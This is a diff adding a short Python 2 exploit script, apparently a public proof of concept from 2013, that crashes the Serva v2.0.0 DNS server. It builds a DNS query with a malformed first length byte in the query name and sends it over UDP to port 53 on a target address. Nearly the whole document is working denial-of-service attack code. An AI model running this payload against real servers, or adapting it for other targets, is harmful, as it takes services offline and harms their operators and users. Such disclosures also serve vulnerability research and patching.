@@ -1,0 +1,38 @@
+#!/usr/bin/python
+
+# Exploit Title: Serva v2.0.0 DNS Server QueryName Remote Denial of Service Vulnerability
+# Version:       v2.0.0
+# Date:          2013-01-14
+# Author:        Julien Ahrens (@MrTuxracer)
+# Homepage:      www.inshell.net
+# Software Link: http://www.vercot.com
+# Tested on:     Windows XP SP3 Professional German
+# Notes:         Malformed QueryName causes the crash
+# Howto:         -
+ 
+import socket
+
+target="192.168.0.1"
+port=53
+
+TransACTID="\x03\xc3"
+Flags="\x01\x00"
+QuestionRRC="\x00\x01"
+AnswerRRC="\x00\x00"
+AuthRRC="\x00\x00"
+AddRRC="\x00\x00"
+QueryName="\xFF\x69\x6e\x73\x68\x65\x6c\x6c\x03\x6e\x65\x74\x00" #vulnerable: first length-byte
+QueryType="\x00\x01"
+QueryClass="\x00\x01"
+payload = TransACTID + Flags + QuestionRRC + AnswerRRC +  AuthRRC + AddRRC + QueryName + QueryType + QueryClass
+
+print "[*] Connecting to Target " + target + "..."
+
+s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0) #udp
+
+print "[*] Sending malformed request..."
+
+s.sendto(payload,(target,port))
+
+print "[!] Exploit has been sent!\n"
+s.close()
